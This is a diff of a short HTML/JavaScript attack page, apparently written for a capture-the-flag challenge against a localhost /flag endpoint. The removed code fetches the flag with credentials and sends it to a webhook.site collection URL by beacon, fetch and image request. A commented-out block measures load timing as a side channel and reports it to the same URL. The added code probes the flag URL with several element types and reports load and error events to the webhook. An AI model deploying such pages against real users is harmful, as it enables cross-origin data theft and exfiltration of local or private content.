@@ -1,52 +1,22 @@
-<!DOCTYPE html>
-<html>
-<body>
-<h1>Firefox Leak</h1>
 <script>
-// In Firefox, localhost might be treated specially
-async function leak() {
-  try {
-    const response = await fetch('http://127.0.0.1/flag', {
-      method: 'GET',
-      credentials: 'include'
-    });
+function probe(tag, attr) {
+  const el = document.createElement(tag);
 
-    const flag = await response.text();
+  el.onload = () => {
+    fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?tag=" + tag + "&event=load");
+  };
+  el.onerror = () => {
+    fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?tag=" + tag + "&event=error");
+  };
 
-    // Multiple exfiltration methods
-    // Method 1: Beacon (works in background)
-    navigator.sendBeacon('https://webhook.site/5dc1560a-274c-4539-af81-568512041310', flag);
-
-    // Method 2: Regular fetch
-    await fetch('https://webhook.site/5dc1560a-274c-4539-af81-568512041310?flag=' + encodeURIComponent(flag));
-
-    // Method 3: Image
-    new Image().src = 'https://webhook.site/5dc1560a-274c-4539-af81-568512041310?f=' + btoa(flag);
-
-  } catch(err) {
-    navigator.sendBeacon('https://webhook.site/5dc1560a-274c-4539-af81-568512041310', 'Error: ' + err.message);
-  }
+  el[attr] = "http://127.0.0.1/flag?cb=" + Math.random();
+  document.body.appendChild(el);
 }
 
-leak();
+probe("img", "src");
+probe("script", "src");
+probe("link", "href");
+probe("iframe", "src");
+probe("video", "src");
+probe("audio", "src");
 </script>
-</body>
-</html>
-
-
-
-<!--<script>-->
-<!--async function measureLoadTime() {-->
-<!--  const start = performance.now();-->
-
-<!--  const img = new Image();-->
-<!--  img.src = "http://127.0.0.1/flag?cachebust=" + Math.random();-->
-
-<!--  img.onload = img.onerror = () => {-->
-<!--    const duration = performance.now() - start;-->
-<!--    fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?time=" + duration);-->
-<!--  };-->
-<!--}-->
-
-<!--measureLoadTime();-->
-<!--</script>-->
